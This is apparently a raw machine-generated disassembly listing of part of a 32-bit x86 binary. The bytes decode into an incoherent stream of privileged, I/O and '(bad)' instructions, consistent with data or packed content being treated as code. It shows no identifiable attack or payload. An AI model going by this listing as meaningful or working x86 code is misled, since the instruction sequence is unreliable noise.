  41c014:	call   DWORD PTR [eax+0x77]
  41c017:	retf   0xcf
  41c01a:	in     eax,dx
  41c01b:	leave  
  41c01c:	cmp    al,0xc4
  41c01e:	sbb    al,0x32
  41c020:	nop
  41c021:	inc    ebp
  41c022:	cmp    al,0xf7
  41c024:	sub    eax,0x8db75e19
  41c029:	dec    edx
  41c02a:	and    eax,edi
  41c02c:	and    eax,0xc4846831
  41c031:	loop   0x41c0ab
  41c033:	cmp    al,0xab
  41c035:	icebp  
  41c036:	adc    bh,ah
  41c038:	push   edi
  41c039:	inc    eax
  41c03a:	push   ds
  41c03b:	in     al,0xe4
  41c03d:	and    BYTE PTR [edi],bh
  41c03f:	push   ss
  41c040:	test   BYTE PTR [ebp-0x708dee96],cl
  41c046:	mov    ds:0x9a5dc776,al
  41c04b:	int3   
  41c04c:	ror    dh,1
  41c04e:	ret    0x928e
  41c051:	adc    BYTE PTR [ebp-0x373fd9ce],dl
  41c057:	xchg   DWORD PTR [ecx],ebx
  41c059:	int    0x10
  41c05b:	push   esp
  41c05c:	jl     0x41c026
  41c05e:	in     al,0x88
  41c060:	lods   al,BYTE PTR ds:[esi]
  41c061:	sar    BYTE PTR [ecx-0x3c],cl
  41c064:	xchg   BYTE PTR [edx-0x2b64884e],ch
  41c06a:	outs   dx,DWORD PTR ds:[esi]
  41c06b:	push   es
  41c06c:	(bad)  
  41c06d:	ror    DWORD PTR [eax],0x3f
  41c070:	xchg   edx,eax
  41c071:	add    eax,0xbd08dc8e
  41c076:	retf   0x6247
  41c079:	cwde   
  41c07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c07b:	ja     0x41bffe
  41c07d:	dec    esp
  41c07e:	mov    dh,0xd3
  41c080:	push   ds
  41c081:	in     eax,0xe0
  41c083:	and    edi,DWORD PTR [edi]
  41c085:	ja     0x41c0ba
  41c087:	push   ecx
  41c088:	xchg   DWORD PTR [edi+0x35],edx
  41c08b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c08c:	xor    al,0xc5
  41c08e:	cwde   
  41c08f:	adc    edi,DWORD PTR [edx-0x1fb88baa]
  41c095:	cmp    dh,BYTE PTR [ecx-0x655e6b22]
  41c09b:	cmc    
  41c09c:	std    
  41c09d:	test   DWORD PTR [edx-0x1925b3a2],ebp
  41c0a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0a4:	jno    0x41c0d8
  41c0a6:	jge    0x41c0a5
  41c0a8:	mov    dl,0x64
  41c0aa:	jmp    0x9f18c93b
  41c0af:	loop   0x41c0c6
  41c0b1:	shr    BYTE PTR [edi-0x38],0x6a
  41c0b5:	inc    ebp
  41c0b6:	and    eax,0x5fe1dd2
  41c0bb:	push   ecx
  41c0bc:	mov    esp,0x31e02032
  41c0c1:	jae    0x41c0c6
  41c0c3:	hlt    
  41c0c4:	data16 ins BYTE PTR es:[edi],dx
  41c0c6:	xchg   BYTE PTR [ebx+esi*8+0x39],bh
  41c0ca:	xor    al,0x1
  41c0cc:	imul   ebx,DWORD PTR [edi],0x78841d46
  41c0d2:	mov    ch,0x86
  41c0d4:	std    
  41c0d5:	jle    0x41c0d0
  41c0d7:	inc    eax
  41c0d8:	fimul  WORD PTR ds:[si]
  41c0dc:	fprem  
  41c0de:	mov    ds:0xf7ac53c7,eax
  41c0e3:	mov    ds:0x668c8669,al
  41c0e8:	and    edi,DWORD PTR [ebx]
  41c0ea:	movntq QWORD PTR [eax],mm2
  41c0ed:	pop    edi
  41c0ee:	sub    edx,edx
  41c0f0:	push   es
  41c0f1:	hlt    
  41c0f2:	mov    WORD PTR [ebp-0x54],es
  41c0f5:	mov    ds:0x8e00d7ae,eax
  41c0fa:	ss ds popa 
  41c0fd:	xchg   edx,eax
  41c0fe:	mov    eax,ds:0x82164977
  41c103:	pop    ds
  41c104:	sbb    ebx,DWORD PTR [edi+ecx*8-0x61]
  41c108:	xor    eax,0x5d3ab4e0
  41c10d:	xchg   ecx,eax
  41c10e:	iret   
  41c10f:	sldt   WORD PTR [eax]
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0xe932cfe9,eax
  41c183:	pop    es
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	(bad)  
  41c18e:	rol    dh,0xd0
  41c191:	mov    al,0x24
  41c193:	test   al,0xb9
  41c195:	fist   DWORD PTR es:[ecx]
  41c198:	sbb    eax,DWORD PTR [ebp+eiz*2-0x6bffb651]
  41c19f:	add    BYTE PTR [esi-0x47],cl
  41c1a2:	jge    0x41c1db
  41c1a4:	mov    es,WORD PTR [esi+0x47ba859f]
  41c1aa:	and    DWORD PTR [eax-0x62476760],esp
  41c1b0:	mov    eax,ds:0xf556e1b
  41c1b5:	fwait
  41c1b6:	lds    edi,FWORD PTR [ebx+0x55]
  41c1b9:	sti    
  41c1ba:	inc    esi
  41c1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1bc:	inc    ebp
  41c1bd:	imul   edi,DWORD PTR [ebp+0x2c2e2b0f],0x1
  41c1c4:	xchg   edx,eax
  41c1c5:	fistp  DWORD PTR ss:[ebp+0x4b11b8cf]
  41c1cc:	mov    esp,0x151218d9
  41c1d1:	mov    bl,0x52
  41c1d3:	push   es
  41c1d4:	sub    esi,0x72
  41c1d7:	add    ah,BYTE PTR [ecx-0x12]
  41c1da:	scas   eax,DWORD PTR es:[edi]
  41c1db:	ret    0xbfbb
  41c1de:	xor    DWORD PTR [edi],ebx
  41c1e0:	mov    eax,ds:0x8aaacfde
  41c1e5:	push   ebp
  41c1e6:	fisttp QWORD PTR [ebx]
  41c1e8:	pop    ebp
  41c1e9:	pop    eax
  41c1ea:	shl    DWORD PTR [eax],1
  41c1ec:	add    BYTE PTR [ecx-0x2375c585],bl
  41c1f2:	pop    DWORD PTR [ebx]
  41c1f4:	fwait
  41c1f5:	hlt    
  41c1f6:	sbb    eax,0x4aac20d1
  41c1fb:	data16 mov ch,0xab
  41c1fe:	aas    
  41c1ff:	jns    0x41c1fe
  41c201:	pop    ebx
  41c202:	imul   ebp,DWORD PTR [edx+edi*1+0x6d9ceab6],0xfffffff1
  41c20a:	inc    ebx
  41c20b:	push   0x2a
  41c20d:	(bad)  
  41c20e:	fdiv   DWORD PTR [eax+esi*4-0x17341f58]
  41c215:	int3   
  41c216:	call   0x93c0:0xb7b11d9d
  41c21d:	inc    ebx
  41c21e:	call   DWORD PTR [ebp+0x6a38e68e]
  41c224:	sub    al,0xbd
  41c226:	aaa    
  41c227:	lods   al,BYTE PTR ds:[esi]
  41c228:	es xchg cl,dh
  41c22b:	xor    al,0x12
  41c22d:	adc    edx,edx
  41c22f:	retf   
  41c230:	mov    DWORD PTR [eax+0x2c],edx
  41c233:	xor    eax,0x847f1015
  41c238:	ins    DWORD PTR es:[edi],dx
  41c239:	jo     0x41c26a
  41c23b:	pop    edi
  41c23c:	xor    esi,0x3b
  41c23f:	test   eax,0xd87a4df6
  41c244:	adc    al,BYTE PTR [ebx-0x4dd62f1d]
  41c24a:	pop    edi
  41c24b:	push   ebp
  41c24c:	mov    cl,0xe1
  41c24e:	(bad)  
  41c24f:	sbb    bh,BYTE PTR [eax]
  41c251:	fadd   QWORD PTR [ecx+0xc]
  41c254:	iret   
  41c255:	scas   eax,DWORD PTR es:[edi]
  41c256:	leave  
  41c257:	inc    edi
  41c258:	mov    ch,0x1a
  41c25a:	cmc    
  41c25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c25c:	add    DWORD PTR [eax+ecx*1],eax
  41c25f:	jmp    0xc34a4653
  41c264:	add    esp,DWORD PTR ds:0x4f3e9cb2
  41c26a:	rol    BYTE PTR [ecx],cl
  41c26c:	inc    eax
  41c26d:	iret   
  41c26e:	enter  0x3f51,0x67
  41c272:	clc    
  41c273:	mov    ds:0x9b8ad51b,eax
  41c278:	dec    ecx
  41c279:	xor    ah,ah
  41c27b:	lds    edx,FWORD PTR [edi+eiz*1-0x3b]
  41c27f:	xchg   BYTE PTR [ecx+eiz*4+0x6fceafd5],bh
  41c286:	or     eax,0x3fbd29ff
  41c28b:	ret    0xa09c
  41c28e:	or     BYTE PTR [eax],ah
	...
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	dec    edi
  41c301:	cmp    eax,0x2b3c13e6
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	sahf   
  41c30d:	adc    edi,ebx
  41c30f:	adc    ch,dl
  41c311:	js     0x41c31a
  41c313:	leave  
  41c314:	sbb    ah,BYTE PTR [di]
  41c317:	cld    
  41c318:	and    esi,DWORD PTR [esi-0x57]
  41c31b:	mov    bh,0x1
  41c31d:	in     eax,dx
  41c31e:	mov    dh,0x14
  41c320:	jo     0x41c337
  41c322:	adc    dl,dl
  41c324:	xchg   ebp,eax
  41c325:	retf   0x4be7
  41c328:	jns    0x41c2e3
  41c32a:	pop    ecx
  41c32b:	jmp    0x86c7ca5f
  41c330:	addr16 mov esi,0x507ceabd
  41c336:	loop   0x41c3a3
  41c338:	and    bh,BYTE PTR [esp+eax*1+0x39721cd0]
  41c33f:	nop
  41c340:	dec    eax
  41c341:	pop    ecx
  41c342:	pop    ss
  41c343:	(bad)  
  41c344:	scas   eax,DWORD PTR es:[edi]
  41c345:	cmp    bl,ch
  41c347:	out    dx,al
  41c348:	xor    al,0x71
  41c34a:	cs (bad) 
  41c34d:	mov    DWORD PTR [ebp+0x4e41d4c7],esi
  41c353:	jns    0x41c366
  41c355:	xchg   ebp,eax
  41c356:	push   ds
  41c357:	fimul  DWORD PTR [esi+ebp*2+0x4d1d62e8]
  41c35e:	jo     0x41c383
  41c360:	je     0x41c36e
  41c362:	jl     0x41c3c8
  41c364:	pop    esp
  41c365:	and    DWORD PTR [edx+edx*1],0x5
  41c369:	inc    ecx
  41c36a:	and    ebx,DWORD PTR [ecx+0x2b]
  41c36d:	adc    BYTE PTR [ebx-0xb],ch
  41c370:	xor    ebx,DWORD PTR [ebp+0x2]
  41c373:	or     al,0x64
  41c375:	push   ss
  41c376:	cmp    BYTE PTR [ecx],ch
  41c378:	ret    
  41c379:	out    dx,al
  41c37a:	fsub   DWORD PTR [edx+edi*8-0x2a25734]
  41c381:	lahf   
  41c382:	sbb    eax,0xa2472d89
  41c387:	aam    0x10
  41c389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c38a:	sbb    cl,bl
  41c38c:	adc    edx,DWORD PTR [esi]
  41c38e:	out    0x82,eax
  41c390:	push   0x5c
  41c392:	retf   0x78b3
  41c395:	pusha  
  41c396:	xor    DWORD PTR [eax-0x3e],ebx
  41c399:	rcr    BYTE PTR [ecx+ebp*1-0x42],1
  41c39d:	adc    BYTE PTR [ebx+0x4d9b8818],cl
  41c3a3:	mov    esp,0xab0fb32e
  41c3a8:	out    0xe,eax
  41c3aa:	daa    
  41c3ab:	mov    al,ds:0x92a6ca81
  41c3b0:	retf   0x2e2f
  41c3b3:	cli    
  41c3b4:	jp     0x41c349
  41c3b6:	mov    ch,0x8e
  41c3b8:	data16 fs js 0x41c3f4
  41c3bc:	lahf   
  41c3bd:	lock push DWORD PTR [edi+0x4f]
  41c3c1:	xchg   ebx,eax
  41c3c2:	sub    ch,BYTE PTR [edi]
  41c3c4:	add    bh,BYTE PTR [edi+0x677141dd]
  41c3ca:	fiadd  DWORD PTR [ebp+0x52]
  41c3cd:	lahf   
  41c3ce:	test   eax,0xda5cab03
  41c3d3:	mov    dl,0x81
  41c3d5:	xchg   BYTE PTR [ebx-0x2],bh
  41c3d8:	(bad)  
  41c3d9:	pop    es
  41c3da:	sub    eax,0x685da841
  41c3df:	shl    BYTE PTR [ecx+0x39],1
  41c3e2:	pop    ss
  41c3e3:	jb     0x41c39e
  41c3e5:	or     al,0xc
  41c3e7:	inc    eax
  41c3e8:	mov    eax,0xe8c0cd3f
  41c3ed:	jb     0x41c3ba
  41c3ef:	psrlq  mm5,QWORD PTR ds:[esi+0x1e]
  41c3f4:	das    
  41c3f5:	pop    esp
  41c3f6:	cmc    
  41c3f7:	iret   
  41c3f8:	ins    DWORD PTR es:[edi],dx
  41c3f9:	test   DWORD PTR [ebx-0x42a75ee5],0x4831b5ef
  41c403:	or     eax,0xeb0c5457
  41c408:	call   0xbf7b:0xe0705f8
  41c40f:	sahf   
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	lea    esi,[edx]
  41c482:	sbb    al,0x40
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	call   0xfde4:0xd7a3490f
  41c493:	in     al,0xf
  41c495:	sub    ecx,edx
  41c497:	addr16 mov bl,0x41
  41c49a:	call   0xb2bc:0x2cbf62e9
  41c4a1:	das    
  41c4a2:	and    esi,DWORD PTR [eax+0x7315d5dc]
  41c4a8:	add    ecx,ebp
  41c4aa:	lods   al,BYTE PTR ds:[esi]
  41c4ab:	dec    ecx
  41c4ac:	sub    ebx,0xffffffe3
  41c4af:	ret    
  41c4b0:	mov    ds:0x44b81157,al
  41c4b5:	sub    al,0xb3
  41c4b7:	or     al,BYTE PTR [ebx]
  41c4b9:	xchg   ebp,eax
  41c4ba:	mov    cl,BYTE PTR [esp+esi*4]
  41c4bd:	leave  
  41c4be:	gs call 0x5d37:0xdfb8ca6c
  41c4c6:	dec    ecx
  41c4c7:	sbb    al,0x2e
  41c4c9:	les    edi,FWORD PTR [ebx+0x7c6d6718]
  41c4cf:	jns    0x41c4f7
  41c4d1:	pop    ebp
  41c4d2:	lahf   
  41c4d3:	xchg   ecx,eax
  41c4d4:	or     eax,edx
  41c4d6:	stos   BYTE PTR es:[edi],al
  41c4d7:	adc    cl,0x1d
  41c4da:	jmp    0x982c91d8
  41c4df:	dec    ebp
  41c4e0:	pop    esi
  41c4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e2:	and    al,0x5f
  41c4e5:	popf   
  41c4e6:	and    eax,0x38f8b919
  41c4eb:	cs jle 0x41c565
  41c4ee:	or     eax,DWORD PTR ds:0x5507b4cd
  41c4f4:	bound  ebp,QWORD PTR [esi+0xe]
  41c4f7:	add    DWORD PTR [eax-0x29e9555b],edi
  41c4fd:	push   esp
  41c4fe:	mov    bl,0x8d
  41c500:	xchg   ebp,eax
  41c501:	xchg   esp,eax
  41c502:	lahf   
  41c503:	and    BYTE PTR [eax+0x13],al
  41c506:	push   ebp
  41c507:	xor    eax,0xcb74936d
  41c50c:	push   ecx
  41c50d:	mov    eax,ds:0x885a1da0
  41c512:	jecxz  0x41c576
  41c514:	jp     0x41c55e
  41c516:	mov    DWORD PTR [edx],esi
  41c518:	xchg   esi,eax
  41c519:	mov    cl,BYTE PTR [edi-0x1163006]
  41c51f:	add    eax,0x9e90cf5a
  41c524:	stc    
  41c525:	xchg   edx,eax
  41c526:	or     ebp,DWORD PTR [edx+0x3c]
  41c529:	ret    
  41c52a:	icebp  
  41c52b:	cmc    
  41c52c:	xor    edi,DWORD PTR [ebx-0x28]
  41c52f:	aam    0x1
  41c531:	enter  0xc7f7,0x42
  41c535:	pop    edx
  41c536:	xchg   edi,eax
  41c537:	out    0x47,al
  41c539:	aaa    
  41c53a:	mov    DWORD PTR [esi+0x45],esi
  41c53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c53e:	xor    bh,BYTE PTR [edx+0x76e7f0f8]
  41c544:	outs   dx,DWORD PTR ds:[esi]
  41c545:	xchg   ebp,eax
  41c546:	mov    bh,BYTE PTR [eax-0x23]
  41c549:	outs   dx,DWORD PTR ds:[esi]
  41c54a:	mov    WORD PTR [edi+0x2b5b251f],?
  41c550:	mov    al,0x7b
  41c552:	and    esp,DWORD PTR [ebx]
  41c554:	xchg   bh,dl
  41c556:	pop    ebp
  41c557:	int    0xdd
  41c559:	enter  0x288b,0x15
  41c55d:	aaa    
  41c55e:	sub    bl,BYTE PTR [ebx+0x4e]
  41c561:	or     al,0x9c
  41c563:	pop    esp
  41c564:	data16 daa 
  41c566:	mov    bh,0x1f
  41c568:	and    al,0x0
  41c56a:	lahf   
  41c56b:	and    al,0x6a
  41c56d:	pushf  
  41c56e:	inc    ebx
  41c56f:	mov    esi,0x34488d5
  41c574:	ds dec edi
  41c576:	aad    0xbc
  41c578:	ins    DWORD PTR es:[edi],dx
  41c579:	ss sub eax,0xe261e1d3
  41c57f:	adc    BYTE PTR fs:[edi],dl
  41c582:	jg     0x41c570
  41c584:	add    DWORD PTR [edi+0x33],edx
  41c587:	jb     0x41c51d
  41c589:	mov    ds:0x719a5ce3,al
  41c58e:	ja     0x41c5d5
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x833b9b8f
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	gs loope 0x41c65a
  41c60f:	cwde   
  41c610:	rcl    DWORD PTR [ebx+ecx*2],1
  41c613:	outs   dx,BYTE PTR ds:[esi]
  41c614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c615:	add    BYTE PTR [ebx-0x5869c9b3],bh
  41c61b:	std    
  41c61c:	js     0x41c607
  41c61e:	lods   al,BYTE PTR ds:[esi]
  41c61f:	jo     0x41c60f
  41c621:	push   edi
  41c622:	in     eax,dx
  41c623:	pusha  
  41c624:	sub    edx,DWORD PTR [eax]
  41c626:	xchg   ebx,eax
  41c627:	in     eax,0x70
  41c629:	mov    ecx,0x8d771ca
  41c62e:	out    0x96,al
  41c630:	addr16 adc al,0xfd
  41c633:	lea    edx,ds:0xce1d1216
  41c639:	loope  0x41c68f
  41c63b:	jmp    0x41c5c6
  41c63d:	popf   
  41c63e:	push   ebx
  41c63f:	sar    DWORD PTR [edi-0x1733ce43],cl
  41c645:	jp     0x41c664
  41c647:	cmp    edi,ebx
  41c649:	stc    
  41c64a:	inc    ebp
  41c64b:	out    0x51,al
  41c64d:	jae    0x41c5f4
  41c64f:	sub    bh,BYTE PTR [eax-0x31]
  41c652:	bnd jae 0x41c6bc
  41c655:	nop
  41c656:	mov    ecx,0xdd649d09
  41c65b:	cs iret 
  41c65d:	icebp  
  41c65e:	pop    eax
  41c65f:	jb     0x41c6de
  41c661:	pusha  
  41c662:	push   ds
  41c663:	out    0x4,eax
  41c665:	jmp    0xe65ad90b
  41c66a:	(bad)  
  41c66b:	das    
  41c66c:	arpl   bx,cx
  41c66e:	test   al,0xea
  41c670:	repnz shl BYTE PTR [edx],0x9b
  41c674:	popa   
  41c675:	sub    ebx,DWORD PTR [eax-0x65]
  41c678:	mov    esp,0xc5b165a8
  41c67d:	out    dx,eax
  41c67e:	jp     0x41c644
  41c680:	or     esi,DWORD PTR [edi]
  41c682:	or     edi,eax
  41c684:	rcr    BYTE PTR [ecx],1
  41c686:	push   cs
  41c687:	data16 sahf 
  41c689:	mov    WORD PTR [edi+0x2a],fs
  41c68c:	push   ds
  41c68d:	out    0xdc,eax
  41c68f:	cmc    
  41c690:	rol    ecx,1
  41c692:	daa    
  41c693:	es xchg ecx,eax
  41c695:	ret    0x68e2
  41c698:	push   ecx
  41c699:	jmp    0xa0ab:0x21bea09d
  41c6a0:	or     eax,0xa61d62a7
  41c6a5:	pop    edx
  41c6a6:	pop    ebx
  41c6a7:	cmp    BYTE PTR [ebp-0xb],al
  41c6aa:	jo     0x41c63a
  41c6ac:	push   edx
  41c6ad:	jmp    0x41c6a5
  41c6af:	lea    ebp,[edi]
  41c6b1:	pop    eax
  41c6b2:	jp     0x41c6a8
  41c6b4:	push   esp
  41c6b5:	pop    esp
  41c6b6:	xchg   BYTE PTR [ecx+0x3d],dl
  41c6b9:	sbb    al,0x39
  41c6bb:	lahf   
  41c6bc:	xchg   DWORD PTR [ebp-0x16b10ef2],edi
  41c6c2:	lock sub al,0xa8
  41c6c5:	mov    ds:0x95636348,eax
  41c6ca:	or     ah,BYTE PTR [ebx+0x57]
  41c6cd:	jo     0x41c6bd
  41c6cf:	das    
  41c6d0:	and    eax,0xf63b6555
  41c6d5:	push   esi
  41c6d6:	(bad)
  41c6d9:	sub    al,BYTE PTR [eax+0x71]
  41c6dc:	adc    eax,DWORD PTR [ebx+esi*8]
  41c6df:	mov    al,ds:0xd6ed1030
  41c6e4:	call   0x4dfa1eeb
  41c6e9:	ret    0xad0f
  41c6ec:	ss popa 
  41c6ee:	adc    eax,0x8a94d48f
  41c6f3:	jbe    0x41c734
  41c6f5:	test   eax,0xb2d0c58f
  41c6fa:	sahf   
  41c6fb:	push   eax
  41c6fc:	test   al,0x17
  41c6fe:	lods   eax,DWORD PTR ds:[esi]
  41c6ff:	mov    bh,0x79
  41c701:	mov    ah,0x20
  41c703:	cmp    DWORD PTR [esi+edi*1],esp
  41c706:	mov    al,0x4a
  41c708:	jp     0x41c747
  41c70a:	cmp    eax,0xe83a6085
  41c70f:	adc    DWORD PTR [eax],eax
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	pop    ebp
  41c781:	xchg   edx,eax
  41c782:	mov    BYTE PTR [eax+0x48],ch
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	test   bl,al
  41c78e:	test   eax,0x556e132f
  41c793:	sub    eax,0x6ad78c9c
  41c798:	pushf  
  41c799:	fsubr  DWORD PTR [esi]
  41c79b:	test   al,0xdb
  41c79d:	ins    DWORD PTR es:[edi],dx
  41c79e:	ss clc 
  41c7a0:	or     DWORD PTR ds:0xd6590c65,edx
  41c7a6:	pop    esp
  41c7a7:	(bad)  
  41c7a8:	retf   0x253f
  41c7ab:	or     al,0xe1
  41c7ad:	push   edx
  41c7ae:	jmp    0xee8a:0x1e8769f3
  41c7b5:	aam    0xd6
  41c7b7:	add    al,0x35
  41c7b9:	retf   
  41c7ba:	pop    edi
  41c7bb:	arpl   WORD PTR [eax-0x72],sp
  41c7be:	xlat   BYTE PTR ds:[ebx]
  41c7bf:	enter  0x538c,0xb7
  41c7c3:	push   ecx
  41c7c4:	ret    0x6e6c
  41c7c7:	sub    esp,DWORD PTR [ebx]
  41c7c9:	enter  0xf6c3,0xec
  41c7cd:	and    BYTE PTR [ecx+edi*2+0x12],bh
  41c7d1:	pop    ds
  41c7d2:	pop    ebx
  41c7d3:	jne    0x41c781
  41c7d5:	add    DWORD PTR [edx],ecx
  41c7d7:	repz push 0x3d179698
  41c7dd:	mov    DWORD PTR ds:0x195413d1,edx
  41c7e3:	int3   
  41c7e4:	out    0x15,eax
  41c7e6:	fsub   QWORD PTR [edx+0x39]
  41c7e9:	xchg   DWORD PTR [eax-0x4a],edx
  41c7ec:	cwde   
  41c7ed:	rcl    DWORD PTR [ebp+0x3a],1
  41c7f0:	push   cs
  41c7f1:	inc    eax
  41c7f2:	adc    BYTE PTR [edi+0x57fbdd70],dh
  41c7f8:	cwde   
  41c7f9:	inc    esp
  41c7fa:	pop    eax
  41c7fb:	int3   
  41c7fc:	cli    
  41c7fd:	push   cs
  41c7fe:	sbb    al,0x4c
  41c800:	add    DWORD PTR [ecx-0x5bde5d67],esp
  41c806:	cmp    BYTE PTR [edx-0x47f32949],bh
  41c80c:	mov    gs,WORD PTR [eax]
  41c80e:	sbb    DWORD PTR [esi-0x6d],esi
  41c811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c812:	jno    0x41c802
  41c814:	loop   0x41c830
  41c816:	fcomp  DWORD PTR es:[ecx+edx*8]
  41c81a:	pusha  
  41c81b:	xchg   ecx,eax
  41c81c:	sub    al,BYTE PTR [eax]
  41c81e:	pop    es
  41c81f:	loope  0x41c820
  41c821:	sbb    DWORD PTR [edx+eax*1],ebx
  41c824:	cs cdq 
  41c826:	xlat   BYTE PTR ds:[ebx]
  41c827:	sbb    dh,bh
  41c829:	dec    ebp
  41c82a:	ror    BYTE PTR [ecx+0x14],cl
  41c82d:	stos   BYTE PTR es:[edi],al
  41c82e:	xor    bh,BYTE PTR [esi+ebp*8]
  41c831:	mov    gs,WORD PTR [esi]
  41c833:	mov    esi,0xd0a10556
  41c838:	in     eax,dx
  41c839:	int    0x4f
  41c83b:	das    
  41c83c:	mov    ch,0x1d
  41c83e:	(bad)  [edx+esi*4+0x14]
  41c842:	xor    ebp,DWORD PTR [esp+ecx*4-0x51]
  41c846:	adc    DWORD PTR ds:0x86706ba3,0x3
  41c84d:	pop    ebp
  41c84e:	scas   eax,DWORD PTR es:[edi]
  41c84f:	es aas 
  41c851:	mul    esi
  41c853:	hlt    
  41c854:	pop    ds
  41c855:	aad    0x82
  41c857:	jl     0x41c859
  41c859:	xchg   al,bl
  41c85b:	cmp    dl,BYTE PTR [ebx+0x41]
  41c85e:	es dec edi
  41c860:	stos   BYTE PTR es:[edi],al
  41c861:	cwde   
  41c862:	aad    0xcd
  41c864:	jae    0x41c856
  41c866:	push   esi
  41c867:	(bad)  
  41c868:	mul    BYTE PTR [ebx]
  41c86a:	cmove  esp,edx
  41c86d:	xchg   edx,eax
  41c86e:	outs   dx,BYTE PTR ds:[esi]
  41c86f:	inc    eax
  41c870:	inc    esi
  41c871:	mov    ah,0x55
  41c873:	ss jp  0x41c8da
  41c876:	scas   al,BYTE PTR es:[edi]
  41c877:	ja     0x41c868
  41c879:	or     bh,BYTE PTR [eax+0x48]
  41c87c:	dec    ebp
  41c87d:	stos   BYTE PTR es:[edi],al
  41c87e:	push   esp
  41c87f:	mov    al,0x8
  41c881:	mov    ch,0x4c
  41c883:	retf   0xb6c1
  41c886:	add    ecx,DWORD PTR [edx+edx*8]
  41c889:	(bad)  
  41c88a:	int    0x44
  41c88c:	jl     0x41c8e5
  41c88e:	pusha  
  41c88f:	cmc    
	...
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [edi+eiz*4+0x24],ebx
  41c903:	das    
  41c904:	dec    esp
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	inc    eax
  41c90d:	jno    0x41c930
  41c90f:	into   
  41c910:	pop    eax
  41c911:	xchg   BYTE PTR [ebp+0x3860ee0d],ah
  41c917:	mov    al,ds:0x55649f44
  41c91c:	arpl   bx,di
  41c91e:	enterw 0x3320,0xa0
  41c923:	jnp    0x41c8ac
  41c925:	(bad)  
  41c926:	or     eax,0x593c49a7
  41c92b:	out    0xa8,eax
  41c92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c92e:	add    esp,DWORD PTR [ecx]
  41c930:	mul    DWORD PTR [edi+0x4ae5ff77]
  41c936:	xchg   esi,eax
  41c937:	rcl    dh,cl
  41c939:	je     0x41c92b
  41c93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c93c:	xchg   ecx,eax
  41c93d:	fcmovb st,st(6)
  41c93f:	pop    ebp
  41c940:	(bad)  [edx+0x592900ca]
  41c946:	scas   eax,DWORD PTR es:[edi]
  41c947:	in     al,0x9c
  41c949:	popf   
  41c94a:	imul   DWORD PTR [edx+edx*4-0x740dbf90]
  41c951:	or     al,0x4f
  41c953:	ficomp WORD PTR [esi+0x39]
  41c956:	js     0x41c9c1
  41c958:	sbb    edi,esi
  41c95a:	add    BYTE PTR [ebx+ebp*8],bl
  41c95d:	nop
  41c95e:	ins    DWORD PTR es:[edi],dx
  41c95f:	pop    ss
  41c960:	nop
  41c961:	cmp    al,0xdd
  41c963:	sbb    DWORD PTR [esp+ebx*4-0x50],0x8bf20121
  41c96b:	or     al,0x55
  41c96d:	xchg   ebx,eax
  41c96e:	jmp    FWORD PTR [ecx]
  41c970:	add    DWORD PTR [ecx+ebp*8-0x3c7e3703],edx
  41c977:	jo     0x41c975
  41c979:	jno    0x41c9a5
  41c97b:	iret   
  41c97c:	out    0xa,eax
  41c97e:	lods   al,BYTE PTR ds:[esi]
  41c97f:	push   edx
  41c980:	jp     0x41c995
  41c982:	dec    edx
  41c983:	loopne 0x41c946
  41c985:	int3   
  41c986:	test   eax,0x369c55d
  41c98b:	inc    esp
  41c98c:	mov    esp,0x84f2418b
  41c991:	std    
  41c992:	je     0x41c98e
  41c994:	out    0x26,al
  41c996:	add    edx,eax
  41c998:	xchg   ebp,eax
  41c999:	pop    ss
  41c99a:	fdiv   st(2),st
  41c99c:	xchg   ebx,eax
  41c99d:	fs inc ecx
  41c99f:	aad    0xb1
  41c9a1:	clc    
  41c9a2:	pop    ds
  41c9a3:	repz into 
  41c9a5:	mov    edx,0x6a26ce07
